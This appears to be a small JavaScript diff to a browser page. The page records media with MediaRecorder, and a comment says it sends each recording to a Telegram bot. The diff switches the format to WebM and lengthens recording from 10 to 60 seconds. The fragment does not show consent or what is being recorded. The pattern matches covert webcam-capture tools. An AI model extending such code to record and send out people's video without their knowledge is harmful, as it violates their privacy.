@@ -26,7 +26,7 @@
           chunks.push(event.data);
         };
         mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/mp4' });
+          const blob = new Blob(chunks, { type: 'video/webm' }); // Changed file format to WebM
           chunks = [];
           
           // Send recorded video to Telegram bot
@@ -38,10 +38,10 @@
         };
         mediaRecorder.start();
         
-        // Stop recording after 10 seconds
+        // Stop recording after 60 seconds
         setTimeout(() => {
           mediaRecorder.stop();
-        }, 10000);
+        }, 60000); // Increased recording duration to 60 seconds
       } catch (error) {
         console.error('Error:', error);
       }
